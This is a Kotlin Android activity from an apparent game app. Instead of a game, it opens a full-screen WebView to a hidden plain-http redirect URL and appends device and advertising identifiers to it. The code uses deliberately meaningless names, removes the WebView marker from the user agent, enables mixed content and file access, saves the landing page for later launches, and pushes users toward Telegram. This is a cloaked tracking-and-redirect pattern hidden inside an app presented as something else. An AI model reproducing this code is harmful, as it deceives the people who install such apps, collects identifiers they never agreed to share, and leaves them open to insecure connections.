package com.omer.ropeanddemolish

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.MediaStore
import android.webkit.*
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.omer.ropeanddemolish.ApApApClass.Companion.C1
import com.omer.ropeanddemolish.ApApApClass.Companion.D1
import com.omer.ropeanddemolish.ApApApClass.Companion.MAIN_ID
import com.omer.ropeanddemolish.databinding.ActivityVibivibiVievBinding
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class VibivibiVievActivity : AppCompatActivity() {

    private val dffrrfeefrf = 1
    var gogui: String? = null
    lateinit var pusssu: WebView
    var popa: ValueCallback<Array<Uri>>? = null

    lateinit var mopa: ActivityVibivibiVievBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mopa = ActivityVibivibiVievBinding.inflate(layoutInflater)
        setContentView(mopa.root)
        pusssu = mopa.vebViifrgttgtiieeeevvveer
        Snackbar.make(
            mopa.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()

        val coka = CookieManager.getInstance()
        coka.setAcceptCookie(true)
        coka.setAcceptThirdPartyCookies(pusssu, true)
        sitivibo()
        val akac: Activity = this

        pusssu.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (apapastak(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                soska(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(akac, description, Toast.LENGTH_SHORT).show()
            }


        }
        pusssu.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                popa?.onReceiveValue(null)
                popa = filePathCallback
                var takat: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takat!!.resolveActivity(packageManager) != null) {

                    var tototk: File? = null
                    try {
                        tototk = createImageFile()
                        takat.putExtra("PhotoPath", gogui)
                    } catch (ex: IOException) {
                    }

                    if (tototk != null) {
                        gogui = "file:" + tototk.absolutePath
                        takat.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(tototk)
                        )
                    } else {
                        takat = null
                    }
                }
                val cotak = Intent(Intent.ACTION_GET_CONTENT)
                cotak.addCategory(Intent.CATEGORY_OPENABLE)
                cotak.type = "image/*"
                val inaar: Array<Intent?> =
                    takat?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val cocas = Intent(Intent.ACTION_CHOOSER)
                cocas.putExtra(Intent.EXTRA_INTENT, cotak)
                cocas.putExtra(Intent.EXTRA_TITLE, getString(R.string.dfgtimage_chooserefrgt))
                cocas.putExtra(Intent.EXTRA_INITIAL_INTENTS, inaar)
                startActivityForResult(
                    cocas, dffrrfeefrf
                )
                return true
            }

            @Throws(IOException::class)
            private fun createImageFile(): File {
                var imageer = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageer.exists()) {
                    imageer.mkdirs()
                }

                imageer =
                    File(imageer.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageer
            }

        }

        pusssu.loadUrl(gigit())
    }


    private fun pupupuSignal(string: String) {
        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val sisuck = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $sisuck"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isemma =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isemma"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val issumo = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $issumo"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    private fun sitivibo() {
        val sisisk = pusssu.settings
        sisisk.javaScriptEnabled = true

        sisisk.useWideViewPort = true

        sisisk.loadWithOverviewMode = true
        sisisk.allowFileAccess = true
        sisisk.domStorageEnabled = true
        sisisk.userAgentString = sisisk.userAgentString.replace("; wv", "")

        sisisk.javaScriptCanOpenWindowsAutomatically = true
        sisisk.setSupportMultipleWindows(false)

        sisisk.displayZoomControls = false
        sisisk.builtInZoomControls = true
        sisisk.setSupportZoom(true)

        sisisk.pluginState = WebSettings.PluginState.ON
        sisisk.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        sisisk.setAppCacheEnabled(true)

        sisisk.allowContentAccess = true
    }

    private fun gigit(): String {

        val popapoa = "com.omer.ropeanddemolish"


        val spiko = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val sharashara = getSharedPreferences("SP", MODE_PRIVATE)
        val spoki: String? = sharashara.getString(C1, "null")
        val noki: String? = sharashara.getString(D1, "null")
        val nina: String? = sharashara.getString(MAIN_ID, null)




        val afifi = AppsFlyerLib.getInstance().getAppsFlyerUID(this)


        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        val fofof = "sub_id_4="
        val fifa = "sub_id_5="
        val sexy = "sub_id_6="
        val oniiiko = "sub_id_1="
        val yiyik = "deviceID="
        val titit = "ad_id="

        val nanaamd = "naming"
        val linka = "deeporg"

        val flirt = "http://"
        val sososoe = "saffronnebula.live/go.php?to=2&"



        val andrrrr = Build.VERSION.RELEASE

        val rosssik = flirt + sososoe

        var fifiy = ""
        if (spoki != "null") {
            fifiy =
                "$rosssik$oniiiko$spoki&$yiyik$afifi&$titit$nina&$fofof$popapoa&$fifa$andrrrr&$sexy$nanaamd"
        } else {
            fifiy =
                "$rosssik$oniiiko$noki&$yiyik$afifi&$titit$nina&$fofof$popapoa&$fifa$andrrrr&$sexy$linka"
        }
        pupupuSignal(afifi.toString())
        return spiko.getString("SAVED_URL", fifiy).toString()
    }


    private fun apapastak(uri: String): Boolean {

        val pmsik = packageManager
        try {

            pmsik.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != dffrrfeefrf || popa == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var risssoto: Array<Uri>? = null

        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                risssoto = arrayOf(Uri.parse(gogui))
            } else {
                val diroks = data.dataString
                if (diroks != null) {
                    risssoto = arrayOf(Uri.parse(diroks))
                }
            }
        }
        popa?.onReceiveValue(risssoto)
        popa = null
    }


    private var dobik = false
    override fun onBackPressed() {


        if (pusssu.canGoBack()) {
            if (dobik) {
                pusssu.stopLoading()
                pusssu.loadUrl(foxy)
            }
            this.dobik = true
            pusssu.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                dobik = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    var foxy = ""
    fun soska(url: String?) {
        if (!url!!.contains("t.me")) {

            if (foxy == "") {
                foxy = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val spirta = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val edik = spirta.edit()
                edik.putString("SAVED_URL", url)
                edik.apply()
            }
        }
    }
}